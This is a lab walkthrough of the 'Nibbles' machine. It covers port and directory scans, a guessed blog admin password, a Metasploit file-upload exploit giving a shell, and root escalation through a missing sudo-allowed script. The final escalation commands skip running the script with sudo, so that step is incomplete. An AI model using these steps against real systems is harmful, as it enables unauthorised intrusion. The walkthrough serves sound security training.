# Nibbles

Address: `10.10.10.75`

## Initial scan

```sh
nmap -A -T5 -p- 10.10.10.75
```

### Nmap results

```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-10 03:40 EDT
Warning: 10.10.10.75 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.75
Host is up (0.20s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   199.01 ms 10.10.14.1
2   199.09 ms 10.10.10.75

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.39 seconds
```

## Result analysis

Open port on 80 and 22. Let's try opening the port 80 in a web browser. If that doesn't work we will try the SSH port.

## Port 80 recon

Going into the webpage for port 80, we find that there is only a simple hello world text inside.
Browsing the source code however, we see that there is a comment in HTML

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

so obviously, we navigate to that subdirectory : `10.10.10.75:80/nibbleblog`

So far nothing out of the obvious.

## Gobuster

Using gobuster on the nibbleblog website:

```sh
gobuster -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Result: 

```
Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.75/nibbleblog/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
=====================================================
/content (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/languages (Status: 301)
=====================================================
```

From here, we navigate to the admin panel

## Admin password cracking
Trying simple `admin` and `nibbles` password combination worked.

## Admin panel
Looking inside settings, we see that this nibbleblog is running on a vulnerable version of nibbleblog. Let's attempt to do some kind of file upload within the nibbleblog

## Metasploit
Using metasploit, we find that there is a nibbleblog module avaialble for use

```sh
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set PASSWORD nibbles
set USERNAME admin
set TARGETURI /nibbleblog/
set RHOST 10.10.10.75
exploit
```

And it gave us a meterpreter shell

## Meterpreter

```sh
getuid # gives us back a nibbler user
sysinfo
# Computer    : Nibbles
# OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
# Meterpreter : php/linux
```

## Priv Esc

Using the meterpreter shell, let's see which commands we can run as sudo
```sh
sudo -l
# Matching Defaults entries for nibbler on Nibbles:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
# User nibbler may run the following commands on Nibbles:
#     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We see that there's a specific file `/home/nibbler/personal/stuff/monitor.sh` that can be run as root

Let's see if that file exists --- And No. It doesn't.

And going into the `/home/nibbler` directory, the folder personal doesn't even exist. So instead, let's try creating those folders and a shell script to help us get a root shell

```sh
mkdir personal
cd personal
mkdir stuff
cd stuff
echo "bash -i" > monitor.sh
whoami # root
cd /root
cat root.txt
```
